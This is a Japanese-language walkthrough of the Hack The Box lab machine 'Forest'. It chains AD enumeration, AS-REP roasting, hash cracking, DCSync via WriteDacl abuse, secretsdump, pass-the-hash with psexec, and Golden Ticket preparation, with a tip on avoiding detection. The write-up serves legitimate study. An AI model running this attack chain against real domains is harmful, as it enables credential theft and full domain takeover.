# Recon

```
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.10.161
...
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-14 04:40:40Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49960/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
...
```
`rpcclient`をパスワード無しで実行する：

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
（この情報は`enum4linux`で出力される`enum4linux -a -M -l -d 10.10.10.161`）

上記の結果より以下のようにユーザリストを作る：


```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ cat users.txt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

# initial shell

joeアカウントがいるか確認しようと`kerbrute`を走らせたら、ユーザsvc-alfrescoにAS-REP Roastingの攻撃ができることが判明：

```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ kerbrute passwordspray -v --user-as-pass --dc 10.10.10.161 -d htb.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/14/22 - Ronnie Flathers @ropnop

2022/10/14 13:59:08 >  Using KDC(s):
2022/10/14 13:59:08 >  	10.10.10.161:88

2022/10/14 13:59:09 >  [!] svc-alfresco@htb.local:svc-alfresco - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2022/10/14 13:59:09 >  [!] santi@htb.local:santi - Invalid password
2022/10/14 13:59:09 >  [!] mark@htb.local:mark - Invalid password
...
```
そこでimpacketのGetNPUsers.pyを実行しsvc-alfrescoのハッシュを得る：
```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb.local/svc-alfresco
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:dd570d12f7405838482c909d700d329c$bec2201781f29c5b9c4aa1c0b15bfeadb1f3cd2bbd99696f123a046388796ee0384d83e588c5331f9aed840b7d98f55126b5ab763df5c375cc9142198df04dcc967a62c94946ab10afa47c3b0296b15e9bbf4c5c2c976b1d7eba2f2a76cac589e307362c758abbf41a603270af48de36f0080be00304397105141362a2fd9f9f455658042a53830d55b2136dc1ffcb323cbec0d9f94a5cd13b9e033a80cfc954900ea74b9fd0ced11d0b73ae03bc6e18912501f9f7abe8bcaaeb1014875a3da34d7f50130c50edd461883f1191c45a0d9af68c5c6f1af828c87f25e7777f85cc591745ecbb47
```
これをtgt-hash.txtというファイル名で保存し、hashcatでクラックする：

```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ hashcat -a 0 -m 18200 tgt-hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting
...
$krb5asrep$23$svc-alfresco@HTB.LOCAL:dd5...b47:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
...
```
これよりsvc-alfrescoのパスワードはs3rviceと判明。

このクリデンシャルを使って`evil-winrm`を実行しsvc-alfrescoのシェルを得る：

```

┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

# Privesc

BloodHoundでターゲットのActive Directoryを解析する。

ターゲット上にSharpHound.exeを送って実行：

```
\SharpHound.exe -c all --nozip
```
これにより生成されたjsonファイルたちをKaliに送り、bloodhoundにアップロードする。

![hound-1](https://user-images.githubusercontent.com/85237728/195855775-8ca06ad9-7f03-4d61-90ba-08122b673882.png)

svc-alfrescoが属すグループの一つACCOUNT OPERATORS(Account Operatorsのメンバは、ユーザ、ローカルグループ、グローバルグループのアカウントなどほとんどの種類のアカウントを作成および変更できる)に注目する。

そして、その先をみると、EXCHANGE WINDOWS PERMISSIONSのメンバはドメインhtb.localにてWriteDaclの権限をもってる。すなわち、DACL (Discretionary Access Control List)の編集が可能。

![houn-2](https://user-images.githubusercontent.com/85237728/195856484-6212a1d5-9df1-45d4-ae2d-90681f5b7df0.png)

WriteDaclのabuseとして、ユーザにDCSyncの権限を与えるという攻撃が考えられる

> DCSyncについて：Domain ControllerになりすましてDomain Controller配下のアカウントのパスワードハッシュを取得する攻撃。MS-DRSRというDomain Controller間でデータ複製に
> 利用されるプロトコルを悪用する。Domain Controllerにデータの同期を要求してパスワードハッシュを得る。

ACCOUNT OPERATORSのメンバはEXCHANGE WINDOWS PERMISSIONSグループに対してGenericAll（なんでもできる）なので、EXCHANGE WINDOWS PERMISSIONSに新規ユーザを追加する。
そしてその追加した新規ユーザにDCSync権限を与える。

新規ユーザを作成する前に、まずsvc-alfresco自身をExcahnge Windows Permissionsグループに入れる：

```
*Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" svc-alfresco /add
The command completed successfully.
```

追加された事を確認：

```
*Evil-WinRM* PS C:\Users\svc-alfresco> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
...
HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
...
```

（"The command completed successfully."と表示されたのに追加されていない場合は、一旦^Cで切断して再度接続し直す）

次に、hackerという新規ユーザをpasswordというパスワードで作成し、Exchange Windows Permissionsグループに追加する：

```
*Evil-WinRM* PS C:\Users\svc-alfresco> net user hacker password /add /domain
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" hacker /add
The command completed successfully.
```
そしたら、PowerView.ps1の`Add-DomainObjectAcl`でユーザhackerにDCSyncの権限を付与する：

```
*Evil-WinRM* PS C:\Users\svc-alfresco> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -PrincipalIdentity hacker -TargetIdentity 'DC=htb, DC=local' -Rights DCSync
```

ここまで済んだら、以下のようにユーザhackerに対して`secretsdump.py`を実行すれば全ドメインユーザのパスワードハッシュが得られる：
```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ impacket-secretsdump -dc-ip 10.10.10.161 'htb.local/hacker:password@10.10.10.161' 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
...
```
AdminのハッシュでPass-the-HashしてAdminのシェルを得る：
```
┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
└─$ rlwrap impacket-psexec -dc-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file tEiyyqNF.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service IVKx on 10.10.10.161.....
[*] Starting service IVKx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

# 感想
priv escのためにはそのユーザが属すグループ一つ一つについて「Reachable High Value Targets」等のenumを逐一すべきだ。

# Golden Ticketを作る
（ターゲットADへのアクセスを永続化のため）

作成にあたり必要な情報は以下の通り：

- ユーザ名
- ドメイン名
- ドメインSID
- krbtgtのハッシュ

(1) ユーザ名

なんでもよい。今回はわかりやすくeviluserとする。（実際の攻撃では既存のユーザ名を使うべき。いきなり新規ユーザが作成されると怪しまれる）

(2) ドメイン名

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PoweView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-Domain


Forest                  : htb.local
DomainControllers       : {FOREST.htb.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : FOREST.htb.local
RidRoleOwner            : FOREST.htb.local
InfrastructureRoleOwner : FOREST.htb.local
Name                    : htb.local
```
ドメイン名はhtb.local。

(3) ドメインSID

現在のユーザのSIDを表示すると

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /user

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
```
末尾の相対識別子（RID）1147を除いたS-1-5-21-3072663084-364016917-1341370565がドメインSID。

(4) krbtgtのハッシュ

これは`secretsdump.py`の出力にある。



